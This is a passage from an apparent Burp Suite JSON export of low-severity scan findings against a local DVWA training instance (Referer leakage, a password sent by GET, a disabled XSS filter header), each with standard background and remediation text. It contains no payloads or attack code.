        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "https://www.google.com/recaptcha/api.js",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "119": {
        "\ufeffissue__serialNumber": "8.09587E+18",
        "issue__type": "5243904",
        "issue__name": "Cross-domain Referer leakage",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/sqli_blind/",
        "issue__location": "/dvwa/vulnerabilities/sqli_blind/",
        "issue__severity": "Information",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>When a web browser makes a request for a resource, it typically adds an HTTP header, called the \"Referer\" header, indicating the URL of the resource from which the request originated. This occurs in numerous situations, for example when a web page loads an image or script, or when a user clicks on a link or submits a form.</p>\\n<p>If the resource being requested resides on a different domain, then the Referer header is still generally included in the cross-domain request. If the originating URL contains any sensitive information within its query string, such as a session token, then this information will be transmitted to the other domain. If the other domain is not fully trusted by the application, then this may lead to a security compromise.</p>\\n<p>You should review the contents of the information being transmitted to other domains, and also determine whether those domains are fully trusted by the originating application.</p>\\n<p>Today's browsers may withhold the Referer header in some situations (for example, when loading a non-HTTPS resource from a page that was loaded over HTTPS, or when a Refresh directive is issued), but this behavior should not be relied upon to protect the originating URL from disclosure.</p>\\n<p>Note also that if users can author content within the application then an attacker may be able to inject links referring to a domain they control in order to capture data from URLs used within the application. </p>",
        "issue__remediationBackground": "<p>Applications should never transmit any sensitive information within the URL query string. In addition to being leaked in the Referer header, such information may be logged in various locations and may be visible on-screen to untrusted parties. If placing sensitive information in the URL is unavoidable, consider using the Referer-Policy HTTP header to reduce the chance of it being disclosed to third parties.\\n</p>",
        "issue__references": "<ul>\\n<li><a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy\">Referer Policy</a></li>\\n    <li><a href=\"https://portswigger.net/web-security/information-disclosure\">Web Security Academy: Information disclosure</a></li>\\n</ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/200.html\">CWE-200: Information Exposure</a></li>\\n</ul>",
        "issue__issueDetail": "The page was loaded from a URL containing a query string:<ul><li>https://localhost:8888/dvwa/vulnerabilities/sqli_blind/</li></ul>The response contains the following link to another domain:<ul><li>https://bobby-tables.com/</li></ul>",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "https://bobby-tables.com/",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "120": {
        "\ufeffissue__serialNumber": "1.06262E+18",
        "issue__type": "4195072",
        "issue__name": "Password submitted using GET method",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/csrf/",
        "issue__location": "/dvwa/vulnerabilities/csrf/",
        "issue__severity": "Low",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>Some applications use the GET method to submit passwords, which are transmitted within the query string of the requested URL. Sensitive information within URLs may be logged in various locations, including the user's browser, the web server, and any forward or reverse proxy servers between the two endpoints. URLs may also be displayed on-screen, bookmarked or emailed around by users. They may be disclosed to third parties via the Referer header when any off-site links are followed. Placing passwords into the URL increases the risk that they will be captured by an attacker.</p>\\n<p>Vulnerabilities that result in the disclosure of users' passwords can result in compromises that are extremely difficult to investigate due to obscured audit trails. Even if the application itself only handles non-sensitive information, exposing passwords puts users who have re-used their password elsewhere at risk.</p>",
        "issue__remediationBackground": "<p>All forms submitting passwords should use the POST method. To achieve this, applications should specify the method attribute of the FORM tag as <b>method=\"POST\"</b>. It may also be necessary to modify the corresponding server-side form handler to ensure that submitted passwords are properly retrieved from the message body, rather than the URL.\\n</p>",
        "issue__references": "",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/598.html\">CWE-598: Information Exposure Through Query Strings in GET Request</a></li>\\n    <li><a href=\"https://capec.mitre.org/data/definitions/37.html\">CAPEC-37: Retrieve Embedded Sensitive Data</a></li>\\n</ul>",
        "issue__issueDetail": "The page contains a form with the following action URL, which is submitted using the GET method:<ul><li>https://localhost:8888/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change</li></ul>The form contains the following password fields:<ul><li>password_new</li><li>password_conf</li></ul>",
        "issue__issueDetailItems__issueDetailItem__001": "password_new",
        "issue__issueDetailItems__issueDetailItem__002": "password_conf",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "121": {
        "\ufeffissue__serialNumber": "4.48404E+18",
        "issue__type": "5245360",
        "issue__name": "Browser cross-site scripting filter disabled",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/xss_r/",
        "issue__location": "/dvwa/vulnerabilities/xss_r/",
        "issue__severity": "Information",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>Some browsers, including Internet Explorer, contain built-in filters designed to protect against cross-site scripting (XSS) attacks. Applications can instruct browsers to disable this filter by setting the following response header:</p>\\n<p><b>X-XSS-Protection: 0</b></p>\\n<p>This behavior does not in itself constitute a vulnerability; in some cases XSS filters may themselves be leveraged to perform attacks against application users. However, in typical situations XSS filters do provide basic protection for application users against some XSS vulnerabilities in applications. The presence of this header should be reviewed to establish whether it affects the application's security posture. </p>",
        "issue__remediationBackground": "<p>Review whether the application needs to disable XSS filters. In most cases you can gain the protection provided by XSS filters without the associated risks by using the following response header:</p>\\n<p><b>X-XSS-Protection: 1; mode=block</b></p>\\n<p>When this header is set, browsers that detect an XSS attack will simply render a blank page instead of attempting to sanitize the injected script. This behavior is considerably less likely to introduce new security issues. </p>",
        "issue__references": "<ul>\\n\t<li><a href=\"https://portswigger.net/web-security/cross-site-scripting\">Web Security Academy: Cross-site scripting</a></li>\\n\t<li><a href=\"http://blogs.msdn.com/b/ieinternals/archive/2011/01/31/controlling-the-internet-explorer-xss-filter-with-the-x-xss-protection-http-header.aspx\">Controlling the XSS Filter</a></li>\\n</ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/16.html\">CWE-16: Configuration</a></li>\\n\t<li><a href=\"https://capec.mitre.org/data/definitions/63.html\">CAPEC-63: Cross-Site Scripting (XSS)</a></li>\\n</ul>",
        "issue__issueDetail": "",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "122": {
        "\ufeffissue__serialNumber": "3.65352E+18",
        "issue__type": "5243904",
        "issue__name": "Cross-domain Referer leakage",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities",
        "issue__location": "/dvwa/vulnerabilities",
        "issue__severity": "Information",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>When a web browser makes a request for a resource, it typically adds an HTTP header, called the \"Referer\" header, indicating the URL of the resource from which the request originated. This occurs in numerous situations, for example when a web page loads an image or script, or when a user clicks on a link or submits a form.</p>\\n<p>If the resource being requested resides on a different domain, then the Referer header is still generally included in the cross-domain request. If the originating URL contains any sensitive information within its query string, such as a session token, then this information will be transmitted to the other domain. If the other domain is not fully trusted by the application, then this may lead to a security compromise.</p>\\n<p>You should review the contents of the information being transmitted to other domains, and also determine whether those domains are fully trusted by the originating application.</p>\\n<p>Today's browsers may withhold the Referer header in some situations (for example, when loading a non-HTTPS resource from a page that was loaded over HTTPS, or when a Refresh directive is issued), but this behavior should not be relied upon to protect the originating URL from disclosure.</p>\\n<p>Note also that if users can author content within the application then an attacker may be able to inject links referring to a domain they control in order to capture data from URLs used within the application. </p>",
        "issue__remediationBackground": "<p>Applications should never transmit any sensitive information within the URL query string. In addition to being leaked in the Referer header, such information may be logged in various locations and may be visible on-screen to untrusted parties. If placing sensitive information in the URL is unavoidable, consider using the Referer-Policy HTTP header to reduce the chance of it being disclosed to third parties.\\n</p>",
        "issue__references": "<ul>\\n<li><a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy\">Referer Policy</a></li>\\n    <li><a href=\"https://portswigger.net/web-security/information-disclosure\">Web Security Academy: Information disclosure</a></li>\\n</ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/200.html\">CWE-200: Information Exposure</a></li>\\n</ul>",
        "issue__issueDetail": "The application contains the following link to another domain from URLs containing a query string:<ul><li>https://en.wikipedia.org/wiki/CAPTCHA</li><li>https://en.wikipedia.org/wiki/Password_cracking</li></ul>This issue was found in multiple locations under the reported path.",
        "issue__issueDetailItems__issueDetailItem__001": "https://en.wikipedia.org/wiki/CAPTCHA",
        "issue__issueDetailItems__issueDetailItem__002": "https://en.wikipedia.org/wiki/Password_cracking",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "123": {
        "\ufeffissue__serialNumber": "6.34921E+18",
        "issue__type": "5243904",
        "issue__name": "Cross-domain Referer leakage",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/xss_d/",
        "issue__location": "/dvwa/vulnerabilities/xss_d/",
        "issue__severity": "Information",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>When a web browser makes a request for a resource, it typically adds an HTTP header, called the \"Referer\" header, indicating the URL of the resource from which the request originated. This occurs in numerous situations, for example when a web page loads an image or script, or when a user clicks on a link or submits a form.</p>\\n<p>If the resource being requested resides on a different domain, then the Referer header is still generally included in the cross-domain request. If the originating URL contains any sensitive information within its query string, such as a session token, then this information will be transmitted to the other domain. If the other domain is not fully trusted by the application, then this may lead to a security compromise.</p>\\n<p>You should review the contents of the information being transmitted to other domains, and also determine whether those domains are fully trusted by the originating application.</p>\\n<p>Today's browsers may withhold the Referer header in some situations (for example, when loading a non-HTTPS resource from a page that was loaded over HTTPS, or when a Refresh directive is issued), but this behavior should not be relied upon to protect the originating URL from disclosure.</p>\\n<p>Note also that if users can author content within the application then an attacker may be able to inject links referring to a domain they control in order to capture data from URLs used within the application. </p>",
        "issue__remediationBackground": "<p>Applications should never transmit any sensitive information within the URL query string. In addition to being leaked in the Referer header, such information may be logged in various locations and may be visible on-screen to untrusted parties. If placing sensitive information in the URL is unavoidable, consider using the Referer-Policy HTTP header to reduce the chance of it being disclosed to third parties.\\n</p>",
        "issue__references": "<ul>\\n<li><a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy\">Referer Policy</a></li>\\n    <li><a href=\"https://portswigger.net/web-security/information-disclosure\">Web Security Academy: Information disclosure</a></li>\\n</ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/200.html\">CWE-200: Information Exposure</a></li>\\n</ul>",
        "issue__issueDetail": "The page was loaded from a URL containing a query string:<ul><li>https://localhost:8888/dvwa/vulnerabilities/xss_d/</li></ul>The response contains the following link to another domain:<ul><li>https://www.acunetix.com/blog/articles/dom-xss-explained/</li></ul>",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "https://www.acunetix.com/blog/articles/dom-xss-explained/",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "124": {
        "\ufeffissue__serialNumber": "4.809E+18",
        "issue__type": "5243904",
        "issue__name": "Cross-domain Referer leakage",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/instructions.php",
        "issue__location": "/dvwa/instructions.php",
        "issue__severity": "Information",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>When a web browser makes a request for a resource, it typically adds an HTTP header, called the \"Referer\" header, indicating the URL of the resource from which the request originated. This occurs in numerous situations, for example when a web page loads an image or script, or when a user clicks on a link or submits a form.</p>\\n<p>If the resource being requested resides on a different domain, then the Referer header is still generally included in the cross-domain request. If the originating URL contains any sensitive information within its query string, such as a session token, then this information will be transmitted to the other domain. If the other domain is not fully trusted by the application, then this may lead to a security compromise.</p>\\n<p>You should review the contents of the information being transmitted to other domains, and also determine whether those domains are fully trusted by the originating application.</p>\\n<p>Today's browsers may withhold the Referer header in some situations (for example, when loading a non-HTTPS resource from a page that was loaded over HTTPS, or when a Refresh directive is issued), but this behavior should not be relied upon to protect the originating URL from disclosure.</p>\\n<p>Note also that if users can author content within the application then an attacker may be able to inject links referring to a domain they control in order to capture data from URLs used within the application. </p>",
        "issue__remediationBackground": "<p>Applications should never transmit any sensitive information within the URL query string. In addition to being leaked in the Referer header, such information may be logged in various locations and may be visible on-screen to untrusted parties. If placing sensitive information in the URL is unavoidable, consider using the Referer-Policy HTTP header to reduce the chance of it being disclosed to third parties.\\n</p>",
        "issue__references": "<ul>\\n<li><a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy\">Referer Policy</a></li>\\n    <li><a href=\"https://portswigger.net/web-security/information-disclosure\">Web Security Academy: Information disclosure</a></li>\\n</ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/200.html\">CWE-200: Information Exposure</a></li>\\n</ul>",
        "issue__issueDetail": "The page was loaded from a URL containing a query string:<ul><li>https://localhost:8888/dvwa/instructions.php</li></ul>The response contains the following links to other domains:<ul><li>https://dvwa.co.uk/</li><li>https://github.com/digininja/DVWA</li><li>https://github.com/digininja/DVWA/archive/master.zip</li><li>https://github.com/digininja/DVWA/issues</li><li>https://hub.docker.com/r/vulnerables/web-dvwa/</li><li>https://mariadb.com/resources/blog/how-to-migrate-from-mysql-to-mariadb-on-linux-in-five-steps/</li><li>https://secure.php.net/manual/en/errorfunc.configuration.php</li><li>https://secure.php.net/manual/en/features.safe-mode.php</li><li>https://secure.php.net/manual/en/filesystem.configuration.php</li><li>https://secure.php.net/manual/en/security.magicquotes.php</li><li>https://www.apachefriends.org/en/xampp.html</li><li>https://www.gnu.org/licenses/</li><li>https://www.google.com/recaptcha/admin/create</li><li>https://www.howtogeek.com/205086/beginner-how-to-make-windows-show-file-extensions/</li><li>https://www.php.net/manual/en/mysqli.requirements.php</li><li>https://www.ryadel.com/en/fix-mysql-server-gone-away-packets-order-similar-mysql-related-errors/</li><li>https://www.virtualbox.org/</li><li>https://www.vmware.com/</li><li>https://www.youtube.com/watch?v=cak2lQvBRAo</li></ul>",
        "issue__issueDetailItems__issueDetailItem__001": "https://dvwa.co.uk/",
        "issue__issueDetailItems__issueDetailItem__002": "https://github.com/digininja/DVWA",
        "issue__issueDetailItems__issueDetailItem__003": "https://github.com/digininja/DVWA/archive/master.zip",
        "issue__issueDetailItems__issueDetailItem__004": "https://github.com/digininja/DVWA/issues",
        "issue__issueDetailItems__issueDetailItem__005": "https://hub.docker.com/r/vulnerables/web-dvwa/",
        "issue__issueDetailItems__issueDetailItem__006": "https://mariadb.com/resources/blog/how-to-migrate-from-mysql-to-mariadb-on-linux-in-five-steps/",
        "issue__issueDetailItems__issueDetailItem__007": "https://secure.php.net/manual/en/errorfunc.configuration.php",
        "issue__issueDetailItems__issueDetailItem__008": "https://secure.php.net/manual/en/features.safe-mode.php",
        "issue__issueDetailItems__issueDetailItem__009": "https://secure.php.net/manual/en/filesystem.configuration.php",
        "issue__issueDetailItems__issueDetailItem__010": "https://secure.php.net/manual/en/security.magicquotes.php",
        "issue__issueDetailItems__issueDetailItem__011": "https://www.apachefriends.org/en/xampp.html",
        "issue__issueDetailItems__issueDetailItem__012": "https://www.gnu.org/licenses/",
        "issue__issueDetailItems__issueDetailItem__013": "https://www.google.com/recaptcha/admin/create",
        "issue__issueDetailItems__issueDetailItem__014": "https://www.howtogeek.com/205086/beginner-how-to-make-windows-show-file-extensions/",
        "issue__issueDetailItems__issueDetailItem__015": "https://www.php.net/manual/en/mysqli.requirements.php",
        "issue__issueDetailItems__issueDetailItem__016": "https://www.ryadel.com/en/fix-mysql-server-gone-away-packets-order-similar-mysql-related-errors/",
        "issue__issueDetailItems__issueDetailItem__017": "https://www.virtualbox.org/",
        "issue__issueDetailItems__issueDetailItem__018": "https://www.vmware.com/",
        "issue__issueDetailItems__issueDetailItem__019": "https://www.youtube.com/watch?v=cak2lQvBRAo",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
